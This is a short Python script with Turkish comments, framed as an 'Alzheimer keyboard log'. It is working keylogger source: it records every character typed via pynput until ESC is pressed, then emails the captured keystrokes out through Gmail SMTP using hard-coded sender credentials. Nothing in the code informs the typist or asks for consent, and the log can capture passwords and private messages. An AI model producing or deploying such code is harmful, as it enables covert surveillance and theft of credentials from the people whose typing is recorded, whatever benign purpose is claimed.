import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard

def send_email(sender_email, sender_password, receiver_email, subject, message):
    # E-posta göndermek için SMTP sunucusuna bağlanma
    smtp_server = 'smtp.gmail.com'  # Eğer başka bir e-posta sağlayıcısı kullanıyorsanız, bu ayarı güncelleyin.
    smtp_port = 587  # Eğer başka bir port kullanıyorsanız, bu ayarı güncelleyin.

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)

    # E-posta oluşturma
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    # E-posta gönderme
    server.send_message(msg)
    server.quit()

# Klavye günlüğünü takip etmek için bir liste
key_logs = []

# Klavye tuşlarına basıldığında çalışacak fonksiyon
def on_press(key):
    try:
        # Tuşa basıldığında, karakter değerini alıp günlük listesine ekliyoruz
        key_logs.append(key.char)
    except AttributeError:
        # Eğer tuş bir karakter tuşu değilse (ör. özel tuşlar), günlük listesine eklemiyoruz
        pass

# Klavye tuşları serbest bırakıldığında çalışacak fonksiyon
def on_release(key):
    if key == keyboard.Key.esc:
        # Eğer ESC tuşuna basılırsa, kayıt işlemini sonlandırıyoruz
        return False

# Klavye dinleme işlemini başlatma
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Klavye günlüğünü birleştirip e-posta mesajını oluşturma
message = "Klavye Günlüğü\n\n" + ''.join(key_logs)

# E-posta ayarları
sender_email = 'gonderici_email@gmail.com'
sender_password = 'gonderici_email_sifresi'
receiver_email = 'alzheimer_hasta_email@gmail.com'
subject = 'Alzheimer Klavye Günlüğü'

# E-posta gönderme
send_email(sender_email, sender_password, receiver_email, subject, message)
